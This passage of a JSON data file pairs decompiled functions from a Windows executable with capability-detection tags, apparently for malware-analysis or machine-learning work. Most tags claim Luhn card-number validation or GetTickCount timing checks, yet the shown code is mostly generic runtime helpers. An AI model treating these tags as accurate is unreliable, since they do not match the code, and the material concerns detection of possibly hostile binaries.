        "decompiled_code": "\nvoid __fastcall fcn.00403af4(uchar param_1, int32_t param_2)\n\n{\n    ulong uVar1;\n    ulong *in_EAX;\n    ushort uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    uVar2 = CONCAT11(param_1, param_1);\n    if (0x1f < param_2) {\n        *in_EAX = uVar2;\n        *(in_EAX + 2) = uVar2;\n        *(in_EAX + 4) = uVar2;\n        *(in_EAX + 6) = uVar2;\n        uVar1 = *in_EAX;\n        *(param_2 + -0x10 + in_EAX) = uVar1;\n        *(param_2 + -8 + in_EAX) = uVar1;\n        iVar3 = (in_EAX & 7) - 8;\n        iVar4 = param_2 + -0x10 + iVar3;\n        iVar3 = iVar4 - iVar3;\n        iVar4 = -iVar4;\n        do {\n            *(in_EAX + iVar4 + iVar3) = uVar1;\n            *(in_EAX + iVar4 + 8 + iVar3) = uVar1;\n            bVar5 = SCARRY4(iVar4, 0x10);\n            iVar4 = iVar4 + 0x10;\n        } while (bVar5 != iVar4 < 0);\n        return;\n    }\n    *(param_2 + -1 + in_EAX) = param_1;\n    switch(param_2) {\n    default:\n        return;\n    case 0x1e:\n    case 0x1f:\n        *(in_EAX + 0x1c) = uVar2;\n    case 0x1c:\n    case 0x1d:\n        *(in_EAX + 0x1a) = uVar2;\n    case 0x1a:\n    case 0x1b:\n        *(in_EAX + 3) = uVar2;\n    case 0x18:\n    case 0x19:\n        *(in_EAX + 0x16) = uVar2;\n    case 0x16:\n    case 0x17:\n        *(in_EAX + 0x14) = uVar2;\n    case 0x14:\n    case 0x15:\n        *(in_EAX + 0x12) = uVar2;\n    case 0x12:\n    case 0x13:\n        *(in_EAX + 2) = uVar2;\n    case 0x10:\n    case 0x11:\n        *(in_EAX + 0xe) = uVar2;\n    case 0xe:\n    case 0xf:\n        *(in_EAX + 0xc) = uVar2;\n    case 0xc:\n    case 0xd:\n        *(in_EAX + 10) = uVar2;\n    case 10:\n    case 0xb:\n        *(in_EAX + 1) = uVar2;\n    case 8:\n    case 9:\n        *(in_EAX + 6) = uVar2;\n    case 6:\n    case 7:\n        *(in_EAX + 4) = uVar2;\n    case 4:\n    case 5:\n        *(in_EAX + 2) = uVar2;\n    case 2:\n    case 3:\n        *in_EAX = uVar2;\n        return;\n    }\n}\n",
        "token_count": 781
    },
    "00403cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403cc4(void)\n\n{\n    uint uVar1;\n    char cStack264;\n    \n    fcn.00405530();\n    fcn.00403cb8();\n    uVar1 = fcn.00405794();\n    while (cStack264 == -1) {\n        fcn.00403cb8();\n        fcn.00405794();\n        fcn.00405818();\n        fcn.00405530();\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "00403fdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403fdc(int32_t param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f98(param_1, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar3 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n            iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n            if (param_1 < iVar2) break;\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n            param_1 = param_1 - iVar2;\n            for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = *param_2;\n                param_2 = param_2 + 1;\n                puVar3 = puVar3 + 1;\n            }\n            iVar2 = (**(in_EAX + 0x1c))();\n            if (iVar2 != 0) {\n                fcn.0040307c();\n                return in_EAX;\n            }\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_1;\n        for (; param_1 != 0; param_1 = param_1 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 399
    },
    "00404618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404618(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x28);\n}\n",
        "token_count": 33
    },
    "00404620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404620(uint param_1, char param_2)\n\n{\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "004046d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046d4(int32_t **param_1, code *UNRECOVERED_JUMPTABLE)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if (UNRECOVERED_JUMPTABLE < 0xff000000) {\n        if (0xfdffffff < UNRECOVERED_JUMPTABLE) {\n    // WARNING: Could not recover jumptable at 0x004046eb. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(UNRECOVERED_JUMPTABLE + *in_EAX))();\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x004046ed. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    ppiVar2 = *((UNRECOVERED_JUMPTABLE & 0xffffff) + in_EAX);\n    if (ppiVar2 == NULL) {\n        piVar1 = *param_1;\n        *param_1 = NULL;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        return;\n    }\n    (*(*ppiVar2)[1])(ppiVar2, param_1, ppiVar2);\n    piVar1 = *ppiVar2;\n    *ppiVar2 = param_1;\n    if (piVar1 == NULL) {\n        return;\n    }\n    (**(*piVar1 + 8))(piVar1);\n    return;\n}\n",
        "token_count": 359
    },
    "00404798": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00404798(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    do {\n        piVar1 = *(in_EAX + -0x48);\n        if (piVar1 != NULL) {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n            do {\n                if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&\n                   (param_2[3] == piVar1[3])) {\n                    return piVar1;\n                }\n                piVar1 = piVar1 + 7;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return NULL;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 251
    },
    "0040481c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040481c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t unaff_SI;\n    uint16_t *puVar2;\n    bool bVar3;\n    \n    do {\n        puVar2 = *(in_EAX + -0x30);\n        if (puVar2 != NULL) {\n            uVar1 = *puVar2;\n            bVar3 = puVar2 + 1 == NULL;\n            puVar2 = puVar2 + 1;\n            do {\n                if (uVar1 == 0) break;\n                uVar1 = uVar1 - 1;\n                bVar3 = unaff_SI == *puVar2;\n                puVar2 = puVar2 + 1;\n            } while (!bVar3);\n            if (bVar3) {\n                return;\n            }\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 236
    },
    "00404890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404890(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x3c);\n}\n",
        "token_count": 34
    },
    "004048d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004048d4(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar1 = 0;\n    uVar5 = 0;\n    uVar3 = *param_2;\n    while( true ) {\n        puVar4 = *(in_EAX + -0x34);\n        if (puVar4 != NULL) {\n            uVar5 = uVar5 & 0xffff0000 | *puVar4;\n            puVar4 = puVar4 + 1;\n            do {\n                uVar2 = uVar1 & 0xffffff00;\n                if (*(puVar4 + 3) == uVar3) {\n                    uVar2 = uVar1 & 0xffff0000 | *(puVar4 + 3);\n                    while (((*(uVar2 + 6 + puVar4) ^ param_2[uVar2]) & 0xdf) == 0) {\n                        uVar2 = uVar2 - 1;\n                        if (uVar2 == 0) {\n                            return *(puVar4 + 1);\n                        }\n                    }\n                    uVar3 = *param_2;\n                }\n                uVar1 = uVar2 & 0xffff0000 | *puVar4;\n                puVar4 = puVar4 + uVar1;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) break;\n        in_EAX = **(in_EAX + -0x24);\n    }\n    return 0;\n}\n",
        "token_count": 401
    },
    "004049cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004049cc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4049fb;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + -0x1c))();\n    *in_FS_OFFSET = uStack32;\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "00404eec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404eec(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint *in_stack_00000014;\n    int32_t in_stack_00000030;\n    \n    *(in_stack_00000030 + 4) = 0x404f37;\n    piVar3 = fcn.00407688();\n    piVar2 = *piVar3;\n    *piVar3 = *piVar2;\n    piVar2 = piVar2[3];\n    puVar1 = piVar2 + 1;\n    *puVar1 = *puVar1 & 0xfffffffd;\n    if (*piVar2 != 0xeedfade) {\n        fcn.00404650();\n        fcn.00404a2c();\n    }\n    *in_stack_00000014 = **in_FS_OFFSET;\n    return 1;\n}\n",
        "token_count": 213
    },
    "00404f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f88(int32_t *arg_8h)\n\n{\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 34
    },
    "0040521c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040521c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.00407550();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 73
    },
    "00405244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405244(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    iVar2 = *in_EAX;\n    ppiVar1 = in_EAX + 1;\n    do {\n        **ppiVar1 = *ppiVar1[1] + ppiVar1[2];\n        ppiVar1 = ppiVar1 + 3;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 121
    },
    "00405554": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405554(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    do {\n        iVar2 = *in_EAX;\n        if ((iVar2 != 0) && (*in_EAX = 0,  0 < *(iVar2 + -8))) {\n            LOCK();\n            piVar1 = iVar2 + -8;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.00402f1c();\n            }\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 183
    },
    "004055f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.004055f4(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (0 < in_EAX) {\n        puVar1 = fcn.00402f00();\n        *(((in_EAX + 10U & 0xfffffffe) - 2) + puVar1) = 0;\n        puVar1[1] = in_EAX;\n        *puVar1 = 1;\n        return puVar1 + 2;\n    }\n    return NULL;\n}\n",
        "token_count": 118
    },
    "0040568c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040568c(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00405530(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.00405650(param_1),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(param_1);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00405728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405728(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; (((*pcVar2 != '\\0' && (pcVar2[1] != '\\0')) && (pcVar2[2] != '\\0')) && (pcVar2[3] != '\\0'));\n            pcVar2 = pcVar2 + 4) {\n        }\n    }\n    uVar1 = fcn.004055f4();\n    if (param_2 != NULL) {\n        fcn.004030fc();\n    }\n    fcn.00405530();\n    *in_EAX = uVar1;\n    return;\n}\n",
        "token_count": 182
    },
    "004057a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057a0(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_EAX;\n    char *pcVar3;\n    \n    pcVar3 = param_2;\n    do {\n        if (param_1 == 0) break;\n        param_1 = param_1 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.004055f4();\n    if (param_2 != NULL) {\n        fcn.004030fc();\n    }\n    fcn.00405530();\n    *in_EAX = uVar2;\n    return;\n}\n",
        "token_count": 176
    },
    "004057b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057b8(uint32_t param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t arg_8h;\n    int16_t *piVar3;\n    bool bVar4;\n    \n    bVar4 = true;\n    uVar2 = param_1;\n    piVar3 = param_2;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        bVar4 = *piVar3 == 0;\n        piVar3 = piVar3 + 1;\n    } while (!bVar4);\n    if (bVar4) {\n        uVar2 = ~uVar2;\n    }\n    arg_8h = uVar2 + param_1;\n    if (arg_8h < 1) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "00405818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405818(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    if (param_2 == 0) {\n        return;\n    }\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        if (!SCARRY4(*(param_2 + -4), *(iVar2 + -4))) {\n            if (param_2 == iVar2) {\n                fcn.00405c6c();\n            }\n            else {\n                fcn.00405c6c();\n            }\n            fcn.004030fc();\n            return;\n        }\n        if (*0x493008 != NULL) {\n            (**0x493008)(param_2);\n        }\n        fcn.00402ff8();\n        return;\n    }\n    if (param_2 != 0) {\n        iVar2 = *(param_2 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            param_2 = fcn.004055f4(param_2);\n            fcn.004030fc();\n        }\n        else {\n            LOCK();\n            *(param_2 + -8) = *(param_2 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = param_2;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 418
    },
    "00405864": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405864(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t **in_EAX;\n    int32_t iVar4;\n    \n    ppiVar3 = param_1;\n    if ((param_2 != NULL) && (ppiVar3 = param_2,  param_1 != NULL)) {\n        if (param_2 != *in_EAX) {\n            if (param_1 == *in_EAX) {\n                in_EAX = param_2;\n                if (!SCARRY4(param_2[-1], param_1[-1])) {\n                    iVar4 = fcn.004055f4();\n                    fcn.004030fc();\n                    fcn.004030fc();\n                    if (iVar4 != 0) {\n                        *(iVar4 + -8) = *(iVar4 + -8) + -1;\n                    }\n                    fcn.00405584();\n                    return;\n                }\n                goto code_r0x00403004;\n            }\n            fcn.00405584();\n        }\n        if (param_1 == NULL) {\n            return;\n        }\n        ppiVar2 = *in_EAX;\n        ppiVar3 = param_1;\n        if (ppiVar2 != NULL) {\n            if (!SCARRY4(param_1[-1], ppiVar2[-1])) {\n                if (param_1 == ppiVar2) {\n                    fcn.00405c6c();\n                }\n                else {\n                    fcn.00405c6c();\n                }\n                fcn.004030fc();\n                return;\n            }\ncode_r0x00403004:\n            if (*0x493008 != NULL) {\n                (**0x493008)(param_1, in_EAX);\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    if (ppiVar3 != NULL) {\n        piVar1 = ppiVar3[-2];\n        if (piVar1 == 0xffffffff || SCARRY4(piVar1, 1) != piVar1 + 1 < 0) {\n            ppiVar3 = fcn.004055f4(ppiVar3);\n            fcn.004030fc();\n        }\n        else {\n            LOCK();\n            ppiVar3[-2] = ppiVar3[-2] + 1;\n        }\n    }\n    piVar1 = *in_EAX;\n    *in_EAX = ppiVar3;\n    if ((piVar1 != NULL) && (0 < piVar1[-2])) {\n        LOCK();\n        piVar1 = piVar1 + -2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 654
    },
    "004058e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.004058e0(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    bool bVar5;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iStack24;\n    \n    piVar4 = NULL;\n    piVar1 = *(&stack0x00000000 + param_2 * 4);\n    if ((piVar1 == NULL) || (*in_EAX != piVar1)) {\n        iVar2 = 0;\n        iVar3 = param_2;\n    }\n    else {\n        iVar2 = piVar1[-1];\n        iVar3 = param_2 + -1;\n        piVar4 = piVar1;\n    }\n    do {\n        piVar1 = *(&stack0x00000000 + iVar3 * 4);\n        if (piVar1 != NULL) {\n            bVar5 = SCARRY4(iVar2, piVar1[-1]);\n            iVar2 = iVar2 + piVar1[-1];\n            if (bVar5) {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            if (piVar4 == piVar1) {\n                piVar4 = NULL;\n            }\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    if (piVar4 == NULL) {\n        iStack24 = fcn.004055f4();\n    }\n    else {\n        fcn.00405c6c();\n        iStack24 = *in_EAX;\n        param_2 = param_2 + -1;\n        piVar4 = in_EAX;\n    }\n    do {\n        if (*(&stack0x00000000 + param_2 * 4) != 0) {\n            fcn.004030fc();\n        }\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    if (piVar4 == NULL) {\n        if (iStack24 != 0) {\n            *(iStack24 + -8) = *(iStack24 + -8) + -1;\n        }\n        fcn.00405584();\n    }\n    // WARNING: Could not recover jumptable at 0x00405969. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 589
    },
    "00405a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405a44(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((in_EAX == 0) || (*(in_EAX + -4) == 0)) || ((0 < param_2 && (*(in_EAX + -4) <= param_2 + -1)))) ||\n       (param_1 < 0)) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00405620();\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00405a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405a84(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00405a34();\n    if (*in_EAX != 0) {\n        if (((0 < param_2) && (param_2 + -1 < *(*in_EAX + -4))) && (0 < param_1)) {\n            fcn.004030fc();\n            fcn.00405c6c();\n        }\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00405acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405acc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00405c6c();\n        fcn.004030fc();\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00405b28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00405b28(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        iVar5 = *(in_EAX + -4);\n        if ((iVar5 <= *(param_2 + -4)) && (0 < iVar5)) {\n            iVar5 = iVar5 + -1;\n            pcVar6 = *(param_2 + -4) + param_2;\n            pcVar4 = param_2 + iVar5;\n            pcVar2 = in_EAX + iVar5;\n            iVar5 = -iVar5;\n            cVar1 = *pcVar2;\n            if (iVar5 != 0) {\n                pcVar3 = pcVar4;\ncode_r0x00405c00:\n                iVar7 = iVar5;\n                if (cVar1 == *pcVar3) goto code_r0x00405c4f;\ncode_r0x00405c04:\n                iVar7 = iVar5;\n                if (cVar1 == pcVar3[1]) goto code_r0x00405c22;\n                while (pcVar3 = pcVar3 + 2,  pcVar3 < pcVar6 + -2) {\n                    while( true ) {\n                        iVar7 = iVar5;\n                        if (cVar1 == *pcVar3) goto code_r0x00405c4f;\n                        if (cVar1 == pcVar3[1]) goto code_r0x00405c22;\n                        if (cVar1 == pcVar3[2]) {\n                            pcVar3 = pcVar3 + 2;\n                            goto code_r0x00405c4f;\n                        }\n                        if (cVar1 == pcVar3[3]) break;\n                        pcVar3 = pcVar3 + 4;\n                        if (pcVar6 + -2 <= pcVar3) {\n                            if (pcVar6 <= pcVar3) {\n                                return NULL;\n                            }\n                            goto code_r0x00405c00;\n                        }\n                    }\n                    pcVar3 = pcVar3 + 2;\ncode_r0x00405c22:\n                    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7 + 1)) {\n                        bVar8 = SCARRY4(iVar7, 2);\n                        iVar7 = iVar7 + 2;\n                        if (bVar8 == iVar7 < 0) {\n                            if (pcVar3 + 2 <= pcVar6) {\n                                return pcVar3 + 2 + -pcVar4;\n                            }\n                            return NULL;\n                        }\n                    }\n                }\n                if (pcVar6 <= pcVar3) {\n                    return NULL;\n                }\n                goto code_r0x00405c00;\n            }\n            pcVar2 = pcVar4;\n            while (cVar1 != *pcVar2) {\n                if (cVar1 == pcVar2[1]) {\ncode_r0x00405bbc:\n                    pcVar3 = NULL;\n                    if (pcVar2 + 2 <= pcVar6) {\n                        pcVar3 = pcVar2 + 2 + -pcVar4;\n                    }\n                    return pcVar3;\n                }\n                pcVar2 = pcVar2 + 2;\n                if (pcVar2 < pcVar6 + -2) {\n                    do {\n                        if (cVar1 == *pcVar2) goto code_r0x00405bac;\n                        if (cVar1 == pcVar2[1]) goto code_r0x00405bbc;\n                        if (cVar1 == pcVar2[2]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405bac;\n                        }\n                        if (cVar1 == pcVar2[3]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405bbc;\n                        }\n                        pcVar2 = pcVar2 + 4;\n                    } while (pcVar2 < pcVar6 + -2);\n                    if (pcVar6 <= pcVar2) {\n                        return NULL;\n                    }\n                }\n                else if (pcVar6 <= pcVar2) {\n                    return NULL;\n                }\n            }\ncode_r0x00405bac:\n            return pcVar2 + (1 - pcVar4);\n        }\n    }\n    return NULL;\ncode_r0x00405c4f:\n    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7)) {\n        bVar8 = SCARRY4(iVar7, 2);\n        iVar7 = iVar7 + 2;\n        if (bVar8 == iVar7 < 0) {\n            return pcVar3 + (1 - pcVar4);\n        }\n    }\n    goto code_r0x00405c04;\n}\n",
        "token_count": 1102
    },
    "00405d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d40(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        if (iVar1 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar1);\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 128
    },
    "00405d8c": {
        "rules": [
